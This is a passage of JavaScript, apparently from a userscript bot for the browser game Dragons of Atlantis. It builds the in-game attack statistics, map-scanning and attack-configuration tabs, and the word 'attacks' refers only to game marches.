			objAddTo ( Data.stats.attacks.levels[level].resources, type, parseInt(resources[type]) );
		}  
		
		// add the talismans to the Arsenal gathered.
		// Wham 1120a - these should now go into spoils items
		var kill_items =  r.report.spoils.kill_items;
		for (var type in kill_items)
		{
			objAddTo ( Data.stats.attacks.items.arsenal, type, parseInt(kill_items[type]) );
			objAddTo ( Data.stats.attacks.levels[level].resources, type, parseInt(kill_items[type]) );
		}
		
		// Wham 1120a
		// Add items to the stats categories
		var items_res = r.report.spoils.items;
		for (var i=0; i < items_res.length; i++)
		{
			var item = items_res[i];
			if ( /(Stack|TroopPrizeItem)/.test(item) ) {
				var quantity = item.replace(/\D/g,'');
				quantity = parseInt( quantity );
				quantity = (isNaN(quantity)) ? 1 : quantity;
				var name = item.replace(/\d/g,'').replace('Stack','').replace('TroopPrizeItem','');
			} else {
				var quantity = parseInt( item );
				quantity = (isNaN(quantity)) ? 1 : quantity;
				var name = item;
			}
			
			if ( /(Blink|Hop|Skip|Jump|Leap|Bounce|Bore|Bolt|Blast)/.test(name) )  {
				objAddTo (Data.stats.attacks.items.speedups, name, quantity);
			} 
			else if ( /(AquaTroopRespirator|StoneTroopItem|FireTroopItem|WindTroopItem|IceTroopItem|SwampTroopItem|FrostGiantItem|ForestTroopItem|DarkSlayerItem|Curse|DragonEgg)/.test(name) ) {
				objAddTo (Data.stats.attacks.items.arsenal, name, quantity);
			} 
			else if ( /(Helmet|Head|ClawGuards|Talons|BodyArmor|Body|TailGuard|Tail|GreenArmor|RedArmor|GoldArmor|BlackArmor|PinkArmor|BlueArmor|SilverArmor)/.test(name) ) {
				objAddTo (Data.stats.attacks.items.armors, name, quantity); 
			}
			else if ( /(TroopPrizeItem)/.test(item) ) {
				objAddTo (Data.stats.attacks.items.trooops, name, quantity); 
			}
			else if ( /(Ticket|Momentary)/.test(name) ) {
				objAddTo (Data.stats.attacks.items.others, name, quantity); 
			}
			else {
				objAddTo (Data.stats.attacks.items.general, name, quantity); 
			}


			objAddTo (Data.stats.attacks.levels[level].resources, name, quantity);			
			objAddTo (Data.stats.attacks.levels[level].items, item, 1);
		}
		
		t.showStats();
	},

	showStats : function ()
	{
		var t = Tabs.Attacks;
		
		var run_time = Data.stats.attacks.run_time;
		if ( Data.options.attacks.enabled ) {
			run_time += ( serverTime() - t.running.start_at );
		}
		
		var run_time_fixed = (run_time > 0) ? (run_time/3600) : 1;
		
		// Wham 1119c - add scrollable table
		var html = 
		 '<table class=' + UID['table'] + '>'
		+'	<tr>'
		+'		<th style="width:155px">' + translate('Start Date') + '</th>'
		+'		<th style="width:155px">' + translate('Run Time') + '</th>'
		+'		<th style="width:155px">' + translate('Attacks') + '</th>'
		+'  </tr>'
		+'  <tr style="border-bottom: 1px solid gray">'
		+'		<td style="text-align:center"><b>' + new Date(Data.stats.attacks.start_at * 1000).myString() + '</b></td>'
		+'		<td style="text-align:center"><b>' + timeFormat(run_time, true) + '</b></td>'
		+'		<td style="text-align:center"><b>' + Data.stats.attacks.total + '</b></td>'
		+'	</tr>'
		+'</table>'
		+'<table class=' + UID['table'] + '>'
    +'  <tr valign=top>'
		+'		<td style="width:50px">' + translate('Armor') + ': </td>'
		+'		<td>' // style="width:415px"
		//+'      <div style="overflow-y:auto;width:410px">'
		+'			<table class="' + UID['table'] + ' zebra">';
		
		// Dragon Armor
		for (var name in Data.stats.attacks.items.armors)
		{
			var per_hour = Data.stats.attacks.items.armors[name] / run_time_fixed;
			html += 
			    '	  <tr align=right>'
			   +'			<td style="width:155px">' 
			   +'				<span>' + translate(name) + '</span>'
			   +'				<span class="' + UID['doa-icons'] + ' i-' + name + '"></span>'
			   +'			</td>'
			   +'			<td style="width:100px">' + Data.stats.attacks.items.armors[name].intToCommas() + '</td>'
			   +'			<td style="width:100px">(' + per_hour.intToCommas() + ' /' + translate('h') + ')</td>'
			   +'		</tr>';
		}
		html +=
		 '		  </table>'
		//+'    </div>'
		+'		</td>'
		+'  </tr>'
		+'  <tr valign=top>'
		+'    <td style="width:50px">' + translate('Items') +': </td>'
		+'    <td>'
		+'      <table class="' +UID['table'] + ' zebra">';
		
		// Tickets, Truce 
		for (var name in Data.stats.attacks.items.others)
		{
			var per_hour = Data.stats.attacks.items.others[name] / run_time_fixed;
			html += 
			    '	  <tr align=right>'
			   +'			<td style="width:155px">' 
			   +'				<span>' + translate(name) + '</span>'
			   +'				<span class="' + UID['doa-icons'] + ' i-' + name + '"></span>'
			   +'			</td>'
			   +'			<td style="width:100px">' + Data.stats.attacks.items.others[name].intToCommas() + '</td>'
			   +'			<td style="width:100px">(' + per_hour.intToCommas() + ' /' + translate('h') + ')</td>'
			   +'		</tr>';
		}
		
		html +=
		 '		  </table>'
		//+'    </div>'
		+'		</td>'
		+'  </tr>'
		+'  <tr valign=top>'
		+'    <td style="width:50px">' + translate('Speedup') +': </td>'
		+'    <td>'
		+'      <table class="' +UID['table'] + ' zebra">';
		
		// Speedups - hops, skips
		for (var name in Data.stats.attacks.items.speedups)
		{
			var per_hour = Data.stats.attacks.items.speedups[name] / run_time_fixed;
			html += 
			    '	  <tr align=right>'
			   +'			<td style="width:155px">' 
			   +'				<span>' + translate(name) + '</span>'
			   +'				<span class="' + UID['doa-icons'] + ' i-' + name + '"></span>'
			   +'			</td>'
			   +'			<td style="width:100px">' + Data.stats.attacks.items.speedups[name].intToCommas() + '</td>'
			   +'			<td style="width:100px">(' + per_hour.intToCommas() + ' /' + translate('h') + ')</td>'
			   +'		</tr>';
		}
		
		html +=
		 '		  </table>'
		+'		</td>'
		+'  </tr>'
		+'  <tr valign=top>'
		+'    <td style="width:50px">' + translate('Arsenal') +': </td>'
		+'    <td>'
		+'      <table class="' +UID['table'] + ' zebra">';
		
		// Arsenal - mandrakes, talons, respirators, talismans, runes
		for (var name in Data.stats.attacks.items.arsenal)
		{
			var per_hour = Data.stats.attacks.items.arsenal[name] / run_time_fixed;
			html += 
			    '	  <tr align=right>'
			   +'			<td style="width:155px">' 
			   +'				<span>' + translate(name) + '</span>'
			   +'				<span class="' + UID['doa-icons'] + ' i-' + name + '"></span>'
			   +'			</td>'
			   +'			<td style="width:100px">' + Data.stats.attacks.items.arsenal[name].intToCommas() + '</td>'
			   +'			<td style="width:100px">(' + per_hour.intToCommas() + ' /' + translate('h') + ')</td>'
			   +'		</tr>';
		}

		html +=
		 '		  </table>'
		+'		</td>'
		+'  </tr>'
		+'  <tr valign=top>'
		+'		<td style="width:50px">' + translate('Resources') + ': </td>'
		+'		<td>'
		+'			<table class="' + UID['table'] + ' zebra">';
		
		// Resources - food, ore, stone, wood
		for (var name in Data.stats.attacks.items.resources)
		{
			var per_hour = Data.stats.attacks.items.resources[name] / run_time_fixed;
			html += 
			 '	<tr align=right>'
			+'			<td style="width:155px">'
			+'				<span>' + translate(name) + '</span>'
			+'				<span class="' + UID['doa-icons'] + ' i-' + name + '"></span>'
			+'			</td>'
			+'			<td style="width:100px">' + Data.stats.attacks.items.resources[name].intToCommas() + '</td>'
			+'			<td style="width:100px">(' + per_hour.intToCommas() + ' /' + translate('h') + ')</td>'
			+'		</tr>';
		}
		
		html +=
		 '		</table>'
		+'		</td>'
		+'	</tr>'
		+'  <tr valign=top>'
		+'    <td style="width:50px">' + translate('Troops') +': </td>'
		+'    <td>'
		+'      <table class="' +UID['table'] + ' zebra">';
		
		// Tickets, Truce 
		for (var name in Data.stats.attacks.items.trooops)
		{
			var per_hour = Data.stats.attacks.items.trooops[name] / run_time_fixed;
			html += 
			    '	  <tr align=right>'
			   +'			<td style="width:155px">' 
			   +'				<span>' + translate(name) + '</span>'
			   +'				<span class="' + UID['doa-icons'] + ' i-' + name + '"></span>'
			   +'			</td>'
			   +'			<td style="width:100px">' + Data.stats.attacks.items.trooops[name].intToCommas() + '</td>'
			   +'			<td style="width:100px">(' + per_hour.intToCommas() + ' /' + translate('h') + ')</td>'
			   +'		</tr>';
		}
		
		html +=
		 '		  </table>'
		+'		</td>'
		+'  </tr>'
		+'</table>';
		
		html +=
		 '<br><div class=' + UID['subtitle'] + '>'+ translate('Statistics') +'&nbsp;'+ translate('of') +'&nbsp;'+ translate('Attacks') +' '+ translate('and') +' '+ translate('Items') +'</div>'
		//+'<div style="height:156px">' //overflow-y:auto;
		+'	<table class="' + UID['table'] + ' zebra">'
		+'		<tr class=' + UID['row_top_headers'] + ' align=center>'
		+'			<td style="background:none !important;"></td>'
		+'			<td align=right colspan=12>'+ translate('Levels') +'</td>'
		+'		</tr>'
		+'		<tr>'
		+'			<td></td>';
		
		for ( i=1; i < 12; i++ ) 
		{
			html += '<th width=45>' + i + '</th>';
		}
		
		html +=
		 '		</tr>'
		+'		<tr>'
		+'			<td colspan=12><HR class=thin></td>'
		+'		</tr>'
		+'		<tr align=right>'
		+'			<td># ' + translate('Attacks') + ':</td>';
		
		for ( i=1; i < 12; i++ )
		{
			html += '<td>' + Data.stats.attacks.levels[i].total + '</td>';
		}
		
		html +=
		'		</tr>'
		+'		<tr>'
		+'			<td colspan=12><HR class=thin></td>'
		+'		</tr>';
		
		var items =  flipStats ('items');     
		for (var p in items)
		{
			html +=
			'<tr align=right>'
			+'		<td>' + translate(p) + ':</td>';
			
			for ( i=1; i < 12; i++ )
			{
				html += '<td>' + items[p][i] + '</td>';
			}
		}
		
		html += '</tr>'
		+'	</table>';
		//+'</div>';
		
		$J('#'+UID['Tabs.Attacks.tabStats.content']).html( html );
		
		function flipStats ( name )
		{
			var o = {};
			for ( var i=1; i < 12; i++ )
			{
				for ( var p in Data.stats.attacks.levels[i][name] )
				{
					if (!o[p])
					{
						o[p] = [];
						for ( var x=1; x < 12; x++ )
						{
							o[p][x] = 0;
						}
					}
					o[p][i] += Data.stats.attacks.levels[i][name][p];
				}
			}
			return o;
		}
	},
	

	
	//*** Attacks Tab - Maps Sub-tab ***
	//----------------------------------------------------------------------------
	map_viewer 		 : null,
	map_viewer_dragger : null,
	map_viewer_terrains:{
		AnthropusCamp:{ enabled:false, color:['0x90','0xB0','0x80'] },
		Bog			 :{ enabled:false, color:['0xC0','0x70','0xB0'] },
		Forest		 :{ enabled:false, color:['0x50','0xA0','0x50'] },
		Grassland	 :{ enabled:false, color:['0x80','0xC0','0x50'] },
		Hill		 :{ enabled:false, color:['0x30','0xB0','0x90'] },
		Lake		 :{ enabled:false, color:['0x50','0x50','0xD0'] },
		Mountain	 :{ enabled:false, color:['0x60','0xB0','0xB0'] },
		Plain		 :{ enabled:false, color:['0xB0','0xB0','0x60'] },
	/*  Fog			 :{ enabled:false, color:['0x30','0x30','0x30'] }, */
		City		 :{ enabled:true,  color:['0xDA','0xD0','0xD0'] },
		Water		 :{ enabled:false, color:['0xB0','0x80','0x50'] },
		Stone		 :{ enabled:false, color:['0xB0','0x80','0x50'] },
		Fire		 :{ enabled:false, color:['0xB0','0x80','0x50'] },
		Wind		 :{ enabled:false, color:['0xB0','0x80','0x50'] },
		Ice			 :{ enabled:false, color:['0xB0','0x80','0x50'] },
		Swamp    	 :{ enabled:false, color:['0xB0','0x80','0x50'] },
		Desert		 :{ enabled:false, color:['0xB0','0x80','0x50'] },
		Spectral	 :{ enabled:false, color:['0xB0','0x80','0x50'] },
		Wildernesses :{ enabled:true, color:['0xC0','0x70','0x70'] },
	},
	
	tabMaps : function()
	{
		var t = Tabs.Attacks;
		
		if (!Data.options.map.scanx || !Data.options.map.scany) {						
			Data.options.map.scanx = Seed.cities[0].x;
			Data.options.map.scany = Seed.cities[0].y;
		}

		var html = 
		 '<div class=' + UID['subtitle'] + '>' + translate('Search') + ' ' + translate('Cities') + '</div>'
		+'<div style="width:100%">'
		+'	<center>'
		+'	<br>'
		+'	<table>'
		+'		<tr>'
		+'			<td style="min-width:100px">'
		+'				<b>'+ translate('Coordinates') +':&nbsp;</b>&nbsp;'
		+'			</td>'
		+'			<td>'
		+'				<b>X:</b> '
		+'				<input id=' + setUID('Tabs.Attacks.tabMaps.coord_x') + ' size=3 maxlength=3 type=text value="' + Data.options.map.scanx + '" /> '
		+'				<b>Y:</b> '
		+'				<input id=' + setUID('Tabs.Attacks.tabMaps.coord_y') + ' size=3 maxlength=3 type=text value="' + Data.options.map.scany + '" /> '
		+'			</td>'
		+'			<td>&nbsp;'
		+'				<input id=' + setUID('Tabs.Attacks.tabMaps.viewMap') + ' type=button value="' + translate('View Map') + '" />'
		+'			</td>'
		+'		</tr>'
		+'		<tr>'
		+'			<td colspan=3>&nbsp;</td>'
		+'		</tr>'
		+'		<tr>'
		+'			<td>'
		+'				<b>' + translate('Search Radius') + ':</b>&nbsp;'
		+'			</td>'
		+'			<td>&nbsp;&nbsp;'
		+'				<select id=' + setUID('Tabs.Attacks.tabMaps.radius') + '>';
		
		for ( var i=16; i <= 64; i+=16 )
		{
			html +=
			'			<option value="' + i + '" ' + (Data.options.map.radius === i ? 'selected' : '') + '>' + i + '</option>';
		}
		
		html += 
		 '				<select> '
		+ translate('miles') + '.&nbsp;&nbsp;'
		+'			</td>'
		+'			<td>&nbsp;'
		+'				<input id=' + setUID('Tabs.Attacks.tabMaps.search') + ' type=button value="' + translate('Search') + ' ' + translate('Cities') + '" />'
		+'			</td>'
		+'		</tr>'
		+'	</table>'
		+'	<br>'
		+'	<br>'
		+'	<table class="' + UID['table'] + ' zebra">'
		+'		<tr>'
		//+'			<th>' + translate('view')  + '</th>'
		+'			<th>' + translate('type')  + '</th>'
		+'			<th>' + translate('total') + '</th>'
		+'		</tr>';
		
		// Add Search Report
		var targets = Map.countTargets( { type : 'all', radius : Data.options.map.radius , x : Data.options.map.scanx, y : Data.options.map.scany } );
		for ( var map_type in targets )
		{
			html += 
			 '<tr>'
			//+'	<td>'
			//+'	<input type=checkbox id=' + setUID('Tabs.Attacks.tabMaps.show_' + map_type) + ' ref=' + Map.names.type[ map_type ] + ' ' + (t.map_viewer_terrains[ map_type ].enabled ? 'CHECKED' : '') + '/>'
			//+'	</td>'
			+'	<td>' 
			+'		<span class="' + UID['doa-icons'] + ' i-' + map_type + '"></span>'
			+ 		translate( map_type )
			+'	</td>'
			+'	<td align=right>'
			+'		<span class=jewel>' + targets[ map_type ] + '</span>'
			+'	</td>'
			+'</tr>';
		}
		

		html +=
		 '</table>'
		+'<center>'
		+'</div>';
		
		// Display the inputs
		$J('#'+UID['Tabs.Attacks.content']).html ( html );

		// add event listeners
		$J('#'+UID['Tabs.Attacks.tabMaps.search']).click ( startScanMap );
		
		$J('#'+UID['Tabs.Attacks.tabMaps.viewMap']).click ( setMapViewer );
		
		//didi modif
		$J('#'+UID['Tabs.Attacks.tabMaps.coord_x']).change (function ( event ) {
			var ex = event.target;
			var x = parseIntZero (ex.value);
			if (isNaN(x) || x < 0 || ex.value.length === 0 ){
				x = Data.options.map.x;
			} 
			ex.value = x;
			Data.options.map.scanx = x;
		});

		//didi modif
		$J('#'+UID['Tabs.Attacks.tabMaps.coord_y']).change (function ( event ) {
			var ey = event.target;
			var y = parseIntZero (ey.value);
			if (isNaN(y) || y < 0 || ey.value.length === 0 ){
				y = Data.options.map.y;
			} 
			ey.value = y;
			Data.options.map.scany = y;
		});

		$J('#'+UID['Tabs.Attacks.tabMaps.radius']).change (function ( event ) {
			
			var element = event.target;
			Data.options.map.radius = parseInt(element.options[element.selectedIndex].value);
			
			if ( t.map_viewer_dragger ) 
			{
				var r = Data.options.map.radius;
				var size = r * 2;
		
				t.map_viewer_dragger.width ( (size - 1) + 'px' );
				t.map_viewer_dragger.height( (size - 1) + 'px' );
				
				var x = parseInt ( $J('#'+UID['Tabs.Attacks.tabMaps.coord_x']).val() ) - r;
				var y = parseInt ( $J('#'+UID['Tabs.Attacks.tabMaps.coord_y']).val() ) - r;
				t.map_viewer_dragger.css({
					left		 : x + 'px',
					top			 : y + 'px',
				});
				
				var $coords_box = $J('#' + UID['map-viewer-dragger-box'] + ' > div');
				if ( y < 100 ) {
					$coords_box.css('margin-top', (r*2+10)+'px');
				} 
				if ( x > 600 ) {
					$coords_box.css('margin-left', '-'+(r*2+30)+'px');
				}
				
			}
		});
		
		
		// search the map for the selected type
		function startScanMap ( event )
		{
			// Disable the search button to avoid creating multiple processes
			var $button = $J(this);
			$button.attr('disabled', true);
		
			verboseLog('<b>scanMap</b>: Begin...');

			var t = Tabs.Attacks;

			var dialogbox = dialogBox({
				id		 : setUID('dialog-scanmap'),
				minWidth : 400,
				centerTo : t.container,
				buttons  : [],
				overlay  : true,
				title	 : translate('Search') + ' ' + translate('Cities'),
				html	 : '<center>' + translate('Scanning Map').replace('$NUM$', Data.options.map.radius) + '<br><br><div class=progressbar></div></center>'
			});
			
			var x = $J('#'+UID['Tabs.Attacks.tabMaps.coord_x']).val() || Data.options.map.x;
			var y = $J('#'+UID['Tabs.Attacks.tabMaps.coord_y']).val() || Data.options.map.y;
			var radius = Data.options.map.radius;
			
			Map.scanMap ({
				x         : x,
				y         : y,
				radius    : radius,
				
				onStart   : function ( r ) {
					StepTimeBar.start ({
						target : $J('#'+UID['dialog-scanmap']+' .progressbar'),
						steps  : r.steps
					});
				},
				
				onProgress: function ( r ) {
					StepTimeBar.update ( r.step );
				},
				
				onSuccess : function( r ) {
					// Re-enable the search button for the next request
					$button.attr('disabled', false);
				
					verboseLog('scanMap: complete!');

					Tabs.Attacks.check_map_busy = false;
					
					var html = 
					 '<center>'
					+'<br>' 
					+ translate('complete') + '!'
					+'<br><br>'
					+ translate('total') + ' ' + r.founds;
					
					dialogbox.html(html);
					dialogbox.centerTo();
					dialogbox.timeOut('15000');
					dialogbox.buttons([
						{
							text: translate('Accept'),
							click: function() { 
								dialogbox.destroy();
							}
						}
					]);
					
					// Didi modif : refresh target list if city or outpost 
					var map_type = Data.options.map.selected;
					if ( /(City|Outpost|Wildernesses)/.test( map_type ) ) {
						t.getActiveObjectList();
					}

					// Refresh the Tab Content
					t.tabMaps();
					

					// Refresh the MapView if is Open
					if ( t.map_viewer && t.map_viewer.isOpen() ) {
						setMapViewer();
					}
				},
				
				onFailure : function( r ) {
					// Re-enable the search button for the next request
					$button.attr('disabled', false);
				
					verboseLog('<b>scanMap</b>: there was an <b>error</b> while scanning the map');
					
					if ( r !== null && r.error ) {
						dialogbox.html( r.error );
					} else {
						dialogbox.html('<B>' + translate('Bummer, there was an error while scanning the map') + '.</B>');
					}
					
					dialogbox.centerTo();
					dialogbox.buttons([
						{
							text: translate('Accept'),
							click: function() { 
								dialogbox.destroy();
							}
						}
					]);
					Tabs.Attacks.check_map_busy = false;
				},
				
				caller : 'Tabs.Attacks.tabMaps.startScanMap'
				
			});
			
		}
		
		// View
		function setMapViewer ( event )
		{

			// Make Container Window
			if ( t.map_viewer === null )
			{
				t.map_viewer = dialogBox({
					id			: UID['map-viewer-box'],
					dialogClass : UID['map-viewer-box'],
					buttons		: {},
					notdestroy	: true,
					position 	: [0,0],
					width		: 752,
					height		: 774,
					title		: translate('View') + ' ' + translate('Map'),
					html		: '<div style="height:750px;width:750px;" id=' + setUID('map-viewer-image') + '></div>'
				});
				t.map_viewer.option( 'show', null );
				t.map_viewer.option( 'hide', null );
				
				t.map_viewer.wheelDelta=0;
				t.map_viewer.mousewheel(function(event, delta) {
				  if (delta > 0) {
					t.map_viewer.wheelDelta += 1;
				} else if (delta < 0) {
					 t.map_viewer.wheelDelta -= 1;
				}
				
				return false; // prevent default
				});
			}
			
			t.map_viewer.open();
			
			// Make PNG Map
			var image = new PNGlib(750, 750, 256); // construcor takes height, weight and color-depth
			var bgcolor = image.color('0x40', '0x50', '0x40'); // set the background
			var fgcolor = image.color('0x70', '0x80', '0x70'); // set the background
			
			var friend = ['0x40','0xF0','0x40'];
			var enemy  = ['0xD0','0x00','0x00'];

			for ( var y=0; y < 750; y++ )
			{
				for ( var x=0; x < 750; x++ )
				{
					var ref = Data.map.terrain[ x + ',' + y ];
					var pixel = image.index(x, y);
					if (ref)
					{
						var map_type = Map.names.cities[ ref[2] ];

						if (map_type) { 
							var terrain = t.map_viewer_terrains[ map_type ];
							if (!terrain) {
								console.log('setMapViewer : erreur on map_type : '+map_type + ' x,y=' + x + ',' + y +' , ref2 ='+ref[2]);
							} else {
								var c = Data.map.players[ ref[0] ].is_friend ? friend : enemy;
								if (terrain.enabled === undefined || terrain === undefined ) console.log('setMapViewer : erreur on map_type : '+map_type);
								image.buffer[pixel] = terrain.enabled ? image.color(terrain.color[0], terrain.color[1], terrain.color[2]) : fgcolor;
							}
						}
						else {
							image.buffer[pixel] = bgcolor;
						}
					}
					else {
						image.buffer[pixel] = bgcolor;
					}
				}
			}
			
			$J('#'+UID['map-viewer-image']).
			css('background-image', 'url(data:image/png;base64,' + image.getBase64() + ')');
			
			// Dragger Coords Fixer
			function fixCoords ( x, y )
			{
				var position = t.map_viewer.dialog( 'option', 'position' ); 
				var map_viewer_x = position[0];
				var map_viewer_y = position[1];
				var x = x - 3 - map_viewer_x + Data.options.map.radius;
				//switch ( Data.options.map.radius )
				//{
				//case 16:
				//	y = y - 14;
				//	break;
				//case 32:
				//	y = y - 7;
				//	break;
				//case 48:
				//	y = y + 0;
				//	break;
				//case 64:
				//	y = y + 7;
				//	break;
				//}
				//
				//y = y - 1 - 7;
				var y = y - 31 - map_viewer_y + Data.options.map.radius; 
				return { x:x, y:y };
			}
			
			// Make Dragger box
			if ( t.map_viewer_dragger === null ) 
			{
				t.map_viewer_dragger = $J('<div><div class=jewel></div></div>').
				attr({
					id		: setUID('map-viewer-dragger-box'),
					class	: UID['map-viewer-dragger']
				}).
				appendTo( $J('#'+UID['map-viewer-box']) );
				
				t.map_viewer_dragger.draggable({
					grid : [16,16],
					
					drag : function( event, ui )
					{
						var offset = $J(event.target).offset();
						var r = Data.options.map.radius;
						var coords = fixCoords(parseInt(offset.left), parseInt(offset.top));
						
						var x_ini = Map.normalize (coords.x - r);
						var y_ini = Map.normalize (coords.y - r);
						var x_end = Map.normalize (coords.x + r);
						var y_end = Map.normalize (coords.y + r);
						
						t.map_viewer_dragger.html('<div class=jewel>' + x_ini + '/' + y_ini + '&nbsp;-&nbsp;' + x_end + '/' + y_end + '</div>');
						
						var $coords_box = $J('#'+UID['map-viewer-dragger-box']+' > div');
						
						if ( offset.top < 100 ) {
							$coords_box.css('margin-top', (r*2+10)+'px');
						} 
						if ( offset.left > 600 ) {
							$coords_box.css('margin-left', '-'+(r*2+30)+'px');
						}
					},
					
					stop : function( event, ui )
					{
						var offset = $J(event.target).offset();
						var coords = fixCoords(parseInt(offset.left), parseInt(offset.top));
						var x = parseInt(Map.normalize (coords.x));
						var y = parseInt(Map.normalize (coords.y));
						
						Data.options.map.scanx = x; //didi modif
						Data.options.map.scany = y; //didi modif
						
						$J('#'+UID['Tabs.Attacks.tabMaps.coord_x']).val(x);
						$J('#'+UID['Tabs.Attacks.tabMaps.coord_y']).val(y);
						
						var $coords_box = $J('#'+UID['map-viewer-dragger-box']+' > div');
						
						if ( offset.top < 100 ) {
							$coords_box.css('margin-top', (r*2+10)+'px');
						} 
						if ( offset.left > 600 ) {
							$coords_box.css('margin-left', '-'+(r*2+30)+'px');
						}
					}
				});
				
			}

			// Set Size & Position of Dragger box
			var r = Data.options.map.radius;
			var x = parseInt ($J('#'+UID['Tabs.Attacks.tabMaps.coord_x']).val() ) - r;
			var y = parseInt ($J('#'+UID['Tabs.Attacks.tabMaps.coord_y']).val() ) - r;
			
			var size = r * 2;

			var x_ini = Map.normalize ( x  );
			var y_ini = Map.normalize ( y  );
			var x_end = Map.normalize ( x + size );
			var y_end = Map.normalize ( y + size );
						
			t.map_viewer_dragger.
			width  ( ( size - 1 ) + 'px' ).
			height ( ( size - 1 ) + 'px' ).
			css ({
				left		 : x + 'px',
				top			 : y + 'px',
			});
						
			var $coords_box = $J('#' + UID['map-viewer-dragger-box'] + ' > div');
			
			$coords_box.html ( x_ini + '/' + y_ini + '&nbsp;-&nbsp;' + x_end + '/' + y_end );
			
			if ( y < 100 ) {
				$coords_box.css('margin-top', (r*2+10)+'px');
			} 
			if ( x > 600 ) {
				$coords_box.css('margin-left', '-'+(r*2+30)+'px');
			}
			
			
		}
		
	},
	
		//*** Attacks Tab - Config Sub-Tab ***
	//----------------------------------------------------------------------------
	tabOptions : function ()
	{
		var t = Tabs.Attacks;
		
		var html = 
		 '<div class=' + UID['title'] + '>'+ translate('Attacks Configuration') + '</div>'
		+'<div>'
		+'	<table class=' + UID['table'] + '>'
		+'	<tr>'
		+'		<td>'+ translate('Maximum requests per hour') +':&nbsp;</td>'
		+'		<td>'
		+			Data.options.marches.requests.max_per_hour
		+'		</td>'
		+'	</tr>'
		+'	<tr>'
		+'		<td>'+ translate('Delay Between Attacks') +':&nbsp;</td>'
		+'		<td>'
		+'		<input id='+ setUID('Tabs.Attacks.tabOptions.delay_min') +' size=3 maxlength=4 type=text value="'+ Data.options.attacks.delay_min +'" />&nbsp;-&nbsp;'
		+'		<input id='+ setUID('Tabs.Attacks.tabOptions.delay_max') +' size=3 maxlength=4 type=text value="'+ Data.options.attacks.delay_max +'" />&nbsp;'+ translate('Seconds').toLowerCase() 
		+'		</td>'
		+'	</tr>'
		+'	<tr>'
		+'		<td>'+ translate('Delete') +' '+ translate('Battle Report') +':&nbsp;</td>'
		+'		<td><input id='+ setUID('Tabs.Attacks.tabOptions.delete_reports') +' '+ (Data.options.attacks.delete_reports?'CHECKED ':'') +' type=checkbox /></td>'
		+'	</tr><tr>'
		+'		<td>'+ translate('Stop if any troops lost') +':&nbsp;</td>'
		+'		<td><input id='+ setUID('Tabs.Attacks.tabOptions.stop_on_loss') +' '+ (Data.options.attacks.stop_on_loss?'CHECKED ':'') +' type=checkbox /></td>'
		+'	</tr>'
		+'	<tr>'
		+'		<td>'+ translate('Randomise attack order') +':&nbsp;</td>'
		+'		<td><input id='+ setUID('Tabs.Attacks.tabOptions.randomise_attacks') +' '+ (Data.options.attacks.randomise_attacks?'CHECKED ':'') +' type=checkbox /></td>'
		+'	</tr>'
		+'	<tr>'
		+'		<td>'+ translate('Display marches by march time') +':&nbsp;</td>'
		+'		<td><input id='+ setUID('Tabs.Attacks.tabOptions.order_by_time') +' '+ (Data.options.attacks.order_by_time?'CHECKED ':'') +' type=checkbox /></td>'
		+'	</tr>'
		+'	<tr>'
		+'		<td>'+ translate('Maximum simultaneous marches') +':&nbsp;</td>'
		+'		<td><input id='+ setUID('Tabs.Attacks.tabOptions.maximum') +' size=2 maxlength=2 type=text value="'+ Data.options.marches.maximum +'" /></td>'
		+'	</tr>'
		+'	<tr>'
		+'		<td>'+ translate('Enable') +' '+ translate('Attacks Logs') +':&nbsp;</td>'
		+'		<td><input id='+ setUID('Tabs.Attacks.tabOptions.log_attacks') +' '+ (Data.options.attacks.log_attacks?'CHECKED ':'') +' type=checkbox /></td>'
		+'	</tr>'
		+'	<tr>'
		+'		<td colspan=2><hr></td>'
		+'	</tr>'
		+'	<tr>'
		+'		<td>'+ translate('Dont flag Wildernesses') +':&nbsp;</td>'
		+'		<td><input id='+ setUID('Tabs.Attacks.tabOptions.abandon_wildernesses') +' '+ (Data.options.attacks.abandon_wildernesses?'CHECKED ':'') +' type=checkbox /></td>'
		+'	</tr>'
		+'	<tr>'
		+'		<td>'+ translate('Withdraw troops if they are encamped') +':&nbsp;</td>'
		+'		<td><input id='+ setUID('Tabs.Attacks.tabOptions.recall_encamped') +' '+ (Data.options.attacks.recall_encamped?'CHECKED ':'') +' type=checkbox /></td>'
		+'	</tr>'
		+'	<tr>'
		+'		<td colspan=2><hr></td>'
		+'	</tr>'
		+'	<tr>'
		+'		<td>'+ translate('Clear last attack on current map') +'&nbsp;</td>'
		+'		<td><input id='+ setUID('Tabs.Attacks.tabOptions.clear_last') +'  type=button value="'+translate('Delete')+'" /></td>'
		+'	</tr>'
		+'	<tr>'
		+'		<td>'+ translate('Clear last attack on all maps') +'&nbsp;</td>'
		+'		<td><input id='+ setUID('Tabs.Attacks.tabOptions.clear_all') +' '+ (Data.options.attacks.clear_all_targets?'CHECKED ':'') +' type=checkbox /></td>'
		+'	</tr>'
		+'</table>';
		
		$J('#'+UID['Tabs.Attacks.content']).html( html );
		
		// Add event listeners
		$J('#'+UID['Tabs.Attacks.tabOptions.delete_reports']).change(function ( event ) {
			Data.options.attacks.delete_reports = event.target.checked;
		});
		
		$J('#'+UID['Tabs.Attacks.tabOptions.stop_on_loss']).change(function ( event ) {
			Data.options.attacks.stop_on_loss = event.target.checked;
		});
		
		$J('#'+UID['Tabs.Attacks.tabOptions.randomise_attacks']).change(function ( event ) {
			Data.options.attacks.randomise_attacks = event.target.checked;
		});

		$J('#'+UID['Tabs.Attacks.tabOptions.order_by_time']).change(function ( event ) {
			Data.options.attacks.order_by_time = event.target.checked;
			if ( Data.options.attacks.order_by_time ) {
				t.targets_sort_by = 'March time';
			} else {
				t.targets_sort_by = 'Distance';
			}
			t.targets.sort(t.targetsSort);
		});

		$J('#'+UID['Tabs.Attacks.tabOptions.log_attacks']).change(function ( event ) {
			Data.options.attacks.log_attacks = event.target.checked;
		});
		
		$J('#'+UID['Tabs.Attacks.tabOptions.abandon_wildernesses']).change(function ( event ) {
			Data.options.attacks.abandon_wildernesses = event.target.checked;
		});
		
		$J('#'+UID['Tabs.Attacks.tabOptions.recall_encamped']).change(function ( event ) {
			Data.options.attacks.recall_encamped = event.target.checked;
		});
		
		$J('#'+UID['Tabs.Attacks.tabOptions._clear_all']).change(function ( event ) {
			Data.options.attacks.clear_all_targets = event.target.checked;
		});
		
		$J('#'+UID['Tabs.Attacks.tabOptions.delay_min']).change( onChangeDelay );
		$J('#'+UID['Tabs.Attacks.tabOptions.delay_max']).change( onChangeDelay );
		$J('#'+UID['Tabs.Attacks.tabOptions.maximum']).change( onChangeMaximum );
		
		$J('#'+UID['Tabs.Attacks.tabOptions.clear_last']).click( clearLast );
